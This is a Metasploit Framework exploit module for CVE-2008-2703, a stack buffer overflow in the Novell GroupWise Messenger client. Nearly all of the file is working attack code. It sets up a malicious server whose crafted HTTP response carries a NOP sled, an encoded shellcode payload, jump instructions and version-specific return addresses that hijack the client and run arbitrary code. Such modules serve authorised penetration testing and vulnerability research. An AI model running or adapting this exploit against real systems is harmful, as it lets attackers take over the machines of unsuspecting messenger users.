##
# $Id: groupwisemessenger_client.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell GroupWise Messenger Client Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell's GroupWise Messenger Client.
				By sending a specially crafted HTTP response, an attacker may be able to execute
				arbitrary code.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2008-2703' ],
					[ 'OSVDB', '46041' ],
					[ 'BID', '29602' ],
					[ 'URL', 'http://www.infobyte.com.ar/adv/ISR-17.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'DisableNops'   =>  'True',
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Novell GroupWise Messenger 2.0 Client', { 'Ret' => 0x502de115 } ],
					[ 'Novell GroupWise Messenger 1.0 Client', { 'Ret' => 0x1000e105 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 2 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The daemon port to listen on.", 8300 ])
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		client.get_once

		date = Time.gm(2008,nil,nil,nil,nil,nil)
		rand_1 = rand_text_english(5)
		rand_2 = rand_text_english(4)
		rand_3 = rand_text_english(rand(8) + 1)
		rand_4 = rand_text_alpha_upper(8)
		rand_5 = rand_text_english(3)

		res =  "HTTP/1.0 200\r\n"
		res << "Date: #{date}\r\n"
		res << "Pragma: no-cache\r\n"
		res << "Cache-Control: no-cache\r\n\r\n"
		res << "\n\0\20\0\0\0nnmFileTransfer\0\2\0\0\x000\0\n\0\t\0\0\0"
		res << "nnmQuery\0\2\0\0\x001\0\n\0\13\0\0\0nnmArchive"
		res << "\0\2\0\0\x001\0\n\0\24\0\0\0nnmPasswordRemember"
		res << "\0\2\0\0\x001\0\n\0\17\0\0\0nnmMaxContacts"
		res << "\0\4\0\0\x00150\0\n\0\16\0\0\0nnmMaxFolders"
		res << "\0\3\0\0\x0050\0\n\0\r\0\0\0nnmBroadcast"
		res << "\0\2\0\0\x001\0\n\0\23\0\0\0nnmPersonalHistory"
		res << "\0\2\0\0\x001\0\n\0\r\0\0\0nnmPrintSave"
		res << "\0\2\0\0\x001\0\n\0\17\0\0\0nnmChatService"
		res << "\0\2\0\0\x001\0\n\0\3\0\0\0CN\0\a\0\0\0ISR000"
		res << "\0\n\0\b\0\0\0Surname\0\6\0\0\0#{rand_1}\0\n\0\n\0\0\0"
		res << "Full Name\0\20\0\0\0Client Name    \0\n\0\13\0\0\0Given Name"
		res << "\0\n\0\0\0Client   \0\n\0\r\0\0\0nnmLastLogin\0\13\0\0\x001200112090\0\t\0\30\0\0\0"
		res << "NM_A_FA_CLIENT_SETTINGS\0\1\0\0\0\n\0\21\0\0\0Novell.AskToSave"
		res << "\0\2\0\0\x001\0\t\0\e\0\0\0NM_A_FA_INFO_DISPLAY_ARRAY"
		res << "\0\1\0\0\0\n\0\27\0\0\0Internet EMail Address\0\26\0\0\0#{rand_1}\@#{rand_4}.#{rand_5}.xx"
		res << "\0\b\0\16\0\0\0NM_A_UD_BUILD\0\a\0\0\0\n\0\13\0\0\0NM_A_SZ_DN\x001\0\0\0"
		res << "CN=ISR000,OU=IT,OU=ISR_,OU=BA,OU=AR,O=#{rand_4}XX"
		res << "\0\t\0\24\0\0\0NM_A_FA_AU_SETTINGS\0\1\0\0\0\n\0\22\0\0\0"
		res << "nnmClientDownload\0\2\0\0\x000\0\b\0\22\0\0\0NM_A_UD_KEEPALIVE"
		res << "\0\n\0\0\0\n\0\24\0\0\0NM_A_SZ_RESULT_CODE\0\2\0\0\x000\0\n\0\27\0\0\0"
		res << "NM_A_SZ_TRANSACTION_ID\0\2\0\0\x001\0\0"

		res << "HTTP/1.0 200\r\n"
		res << "Date: #{date}\r\n"
		res << "Pragma: no-cache\r\n"
		res << "Cache-Control: no-cache\r\n\r\n"
		res << "\n\0\24\0\0\0NM_A_SZ_RESULT_CODE\0\2\0\0\x000\0\n\0\27\0\0\0"
		res << "NM_A_SZ_TRANSACTION_ID\0\2\0\0\x00#{rand_2}\0\0"
		res << make_nops(805 - payload.encoded.length) + payload.encoded
		res << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')
		res << [0xe9, -800].pack('CV') + rand_text_english(5000 - payload.encoded.length)

		print_status("Sending #{self.name} to #{client.peerhost}:#{client.peerport}...")
		client.put(res)
		handler(client)

		select(nil,nil,nil,2)
		service.close_client(client)
	end

end
